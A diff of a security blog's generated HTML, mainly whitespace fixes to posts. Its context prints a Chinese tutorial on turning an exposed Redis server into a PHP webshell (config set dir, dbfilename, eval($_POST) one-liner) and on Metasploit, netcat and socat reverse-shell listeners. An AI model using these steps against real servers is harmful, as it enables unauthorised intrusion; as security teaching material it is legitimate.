@@ -160,7 +160,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">120</span>
+          <span class="site-state-item-count">122</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -264,7 +264,7 @@
 <p>RDB: Redis DataBase (默认)<br>
 AOF: Append Only File</p>
 <h2 id="Webshell-提权">Webshell 提权</h2>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis-cli -h example.com -p 6379</span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /www/admin/localhost_80/wwwroot</span><br><span class="line">config <span class="built_in">set</span> dbfilename redis.php</span><br><span class="line"><span class="built_in">set</span> x “&lt;?php @<span class="built_in">eval</span> (<span class="variable">$_POST</span>[hajimi]): ?&gt;”</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis-cli -h example.com -p 6379</span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /www/admin/localhost_80/wwwroot</span><br><span class="line">config <span class="built_in">set</span> dbfilename redis.php</span><br><span class="line"><span class="built_in">set</span> x “&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[hajimi]): ?&gt;”</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
 <span id="more"></span>
 <h2 id="反弹连接">反弹连接</h2>
 <h3 id="原因">原因</h3>
@@ -275,7 +275,7 @@ AOF: Append Only File</p>
 <li>一句话木马被杀软删除</li>
 </ul>
 <h3 id="监听">监听</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#netcat</span></span><br><span class="line">nc -lvp 7777</span><br><span class="line"></span><br><span class="line"><span class="comment">#msf</span></span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.xxx.xxx</span><br><span class="line"><span class="built_in">set</span> lport 7777</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"><span class="comment">#socat (kali)</span></span><br><span class="line">socat TCP-LISTEN:7777 -</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#netcat</span></span><br><span class="line">nc -lvp 7777</span><br><span class="line"></span><br><span class="line"><span class="comment">#msf</span></span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.xxx.xxx</span><br><span class="line"><span class="built_in">set</span> lport 7777</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"><span class="comment">#socat(kali)</span></span><br><span class="line">socat TCP-LISTEN:7777 -</span><br></pre></td></tr></table></figure>
 <h3 id="靶机建立反弹连接">靶机建立反弹连接</h3>
 <p><img data-src="/img/msb/17389164721036.jpg" alt=""></p>
 <p><img data-src="/img/msb/17389177981544.png" alt=""></p>
